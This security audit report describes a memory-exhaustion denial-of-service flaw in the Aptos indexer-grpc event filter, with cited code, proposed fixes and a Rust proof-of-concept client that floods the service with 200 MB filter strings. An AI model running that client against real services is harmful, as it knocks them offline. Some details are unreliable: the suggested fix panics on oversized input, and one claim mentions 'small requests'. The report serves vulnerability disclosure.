# Audit Report

## Title
Resource Exhaustion via Unvalidated Protobuf String Fields in Indexer-GRPC EventFilter

## Summary
The `EventFilter` protobuf-to-native conversion lacks pre-deserialization size validation for the `data_substring_filter` field, allowing attackers to send messages with strings up to 256 MB that exhaust heap memory before application-level size checks are enforced.

## Finding Description

The indexer-grpc data service accepts `BooleanTransactionFilter` messages containing `EventFilter` objects with a `data_substring_filter` string field. The vulnerability exists in a classic Time-of-Check-Time-of-Use (TOCTOU) pattern where size validation occurs **after** memory allocation:

**Attack Flow:**

1. The gRPC service is configured with a maximum message size of 256 MB [1](#0-0) 

2. When a client sends a `GetTransactionsRequest` with a `transaction_filter`, the protobuf deserialization happens automatically in the tonic/prost framework, allocating heap memory for all string fields including `data_substring_filter`

3. The `EventFilter::from()` conversion directly assigns the protobuf string without any validation [2](#0-1) 

4. Only **after** the 256 MB string is already allocated in memory does the code check the filter size via `BooleanTransactionFilter::new_from_proto()` [3](#0-2) 

5. The application-level limit defaults to only 10 KB [4](#0-3) 

6. The request is rejected, but the memory was already allocated during deserialization

**Critical Code Paths:**

The protobuf definition allows unbounded strings [5](#0-4) 

The validation in `EventFilter::validate_state()` only checks that at least one field is set, but performs no size validation on the string content since `Option<String>::validate_state()` simply returns `Ok(())` [6](#0-5) 

## Impact Explanation

This is a **High Severity** vulnerability per Aptos bug bounty criteria:

- **Validator node slowdowns**: If the indexer-grpc service runs on validator infrastructure, repeated memory exhaustion attacks can degrade validator performance
- **API crashes**: Memory exhaustion can cause OOM crashes of the indexer-grpc service, disrupting the ecosystem
- **DoS on critical infrastructure**: The indexer-grpc service is critical for dApp developers and ecosystem participants

An attacker can:
- Send multiple concurrent gRPC requests, each with 256 MB filter strings
- Cause heap memory exhaustion on the indexer service
- Force OOM crashes or severe memory pressure
- Disrupt service availability for legitimate users

This breaks **Invariant #9: Resource Limits** - "All operations must respect gas, storage, and computational limits." The system fails to enforce memory limits before allocation occurs.

## Likelihood Explanation

**Likelihood: High**

- **Attack complexity**: Trivial - any gRPC client can send these requests
- **Authentication required**: None - gRPC endpoints are publicly accessible
- **Prerequisites**: Just need to craft a protobuf message with a large string
- **Detection difficulty**: Easy to execute silently with many small requests
- **Exploitability**: Can be automated to repeatedly exhaust memory

The attack requires no special privileges, insider access, or cryptographic breaks. The gRPC service accepts requests from any client, making this immediately exploitable.

## Recommendation

Implement size validation **before** protobuf deserialization by using tonic's built-in per-request message size limits. The fix should:

1. **Reduce the global MAX_MESSAGE_SIZE** to match the application-level filter size limit, or add per-RPC method limits:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs
// Instead of 256 MB, use a reasonable limit like 1 MB for filter requests
pub(crate) const MAX_FILTER_REQUEST_SIZE: usize = 1 * (1 << 20); // 1 MB
```

2. **Configure different limits for different RPC methods**:

```rust
let wrapper_service =
    aptos_protos::indexer::v1::data_service_server::DataServiceServer::from_arc(wrapper)
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Gzip)
        .max_decoding_message_size(MAX_FILTER_REQUEST_SIZE) // Separate limit for requests with filters
        .max_encoding_message_size(MAX_MESSAGE_SIZE);       // Large responses are OK
```

3. **Add explicit validation in the EventFilter proto conversion**:

```rust
impl From<aptos_protos::indexer::v1::EventFilter> for EventFilter {
    fn from(proto_filter: aptos_protos::indexer::v1::EventFilter) -> Self {
        // Validate string size limits during conversion
        if let Some(ref filter_str) = proto_filter.data_substring_filter {
            const MAX_SUBSTRING_FILTER_BYTES: usize = 1024; // 1 KB reasonable limit
            if filter_str.len() > MAX_SUBSTRING_FILTER_BYTES {
                panic!("data_substring_filter exceeds maximum size");
            }
        }
        
        Self {
            data_substring_filter: proto_filter.data_substring_filter,
            struct_type: proto_filter.struct_type.map(|f| f.into()),
            data_substring_finder: OnceCell::new(),
        }
    }
}
```

## Proof of Concept

```rust
// PoC: Rust client demonstrating the memory exhaustion attack
use aptos_protos::indexer::v1::{
    BooleanTransactionFilter, EventFilter, ApiFilter, GetTransactionsRequest,
    data_service_client::DataServiceClient,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer-grpc service
    let mut client = DataServiceClient::connect("http://indexer-grpc-service:50051").await?;
    
    // Create an EventFilter with a 200 MB string (within 256 MB gRPC limit)
    let large_string = "A".repeat(200 * 1024 * 1024); // 200 MB string
    
    let event_filter = EventFilter {
        struct_type: None,
        data_substring_filter: Some(large_string), // 200 MB allocation
    };
    
    let api_filter = ApiFilter {
        filter: Some(aptos_protos::indexer::v1::api_filter::Filter::EventFilter(event_filter)),
    };
    
    let boolean_filter = BooleanTransactionFilter {
        filter: Some(
            aptos_protos::indexer::v1::boolean_transaction_filter::Filter::ApiFilter(api_filter)
        ),
    };
    
    // Send the request - this will allocate 200 MB during deserialization
    // Even though it will be rejected by the 10 KB filter size limit,
    // the memory is already allocated at this point
    let request = Request::new(GetTransactionsRequest {
        starting_version: Some(0),
        transactions_count: None,
        batch_size: None,
        transaction_filter: Some(boolean_filter),
    });
    
    // Send multiple concurrent requests to exhaust memory
    let mut handles = vec![];
    for _ in 0..10 {
        let mut client_clone = client.clone();
        let req_clone = request.clone();
        handles.push(tokio::spawn(async move {
            // Each request allocates 200 MB before being rejected
            let _ = client_clone.get_transactions(req_clone).await;
        }));
    }
    
    // Wait for all requests - 10 concurrent requests Ã— 200 MB = 2 GB heap exhaustion
    for handle in handles {
        handle.await?;
    }
    
    println!("Successfully exhausted ~2 GB of heap memory");
    Ok(())
}
```

## Notes

- The vulnerability affects all indexer-grpc services in the Aptos ecosystem
- While the gRPC framework's 256 MB limit provides some protection against truly massive allocations, it still allows memory exhaustion attacks orders of magnitude larger than the intended 10 KB filter size limit
- The same pattern may exist in other protobuf message conversions with string fields throughout the codebase
- The fix requires coordination between the gRPC transport layer configuration and application-level validation logic

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/filters/event.rs (L44-51)
```rust
impl From<aptos_protos::indexer::v1::EventFilter> for EventFilter {
    fn from(proto_filter: aptos_protos::indexer::v1::EventFilter) -> Self {
        Self {
            data_substring_filter: proto_filter.data_substring_filter,
            struct_type: proto_filter.struct_type.map(|f| f.into()),
            data_substring_finder: OnceCell::new(),
        }
    }
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/filters/event.rs (L65-73)
```rust
    fn validate_state(&self) -> Result<(), FilterError> {
        if self.data_substring_filter.is_none() && self.struct_type.is_none() {
            return Err(Error::msg("At least one of data or struct_type must be set").into());
        };

        self.data_substring_filter.is_valid()?;
        self.struct_type.is_valid()?;
        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/transaction-filter/src/boolean_transaction_filter.rs (L94-107)
```rust
    pub fn new_from_proto(
        proto_filter: aptos_protos::indexer::v1::BooleanTransactionFilter,
        max_filter_size: Option<usize>,
    ) -> Result<Self> {
        if let Some(max_filter_size) = max_filter_size {
            ensure!(
                proto_filter.encoded_len() <= max_filter_size,
                format!(
                    "Filter is too complicated. Max size: {} bytes, Actual size: {} bytes",
                    max_filter_size,
                    proto_filter.encoded_len()
                )
            );
        }
```

**File:** config/src/config/indexer_grpc_config.rs (L21-21)
```rust
const DEFAULT_MAX_TRANSACTION_FILTER_SIZE_BYTES: usize = 10_000;
```

**File:** protos/proto/aptos/indexer/v1/filter.proto (L45-48)
```text
message EventFilter {
  optional MoveStructTagFilter struct_type = 1;
  optional string data_substring_filter = 2;
}
```
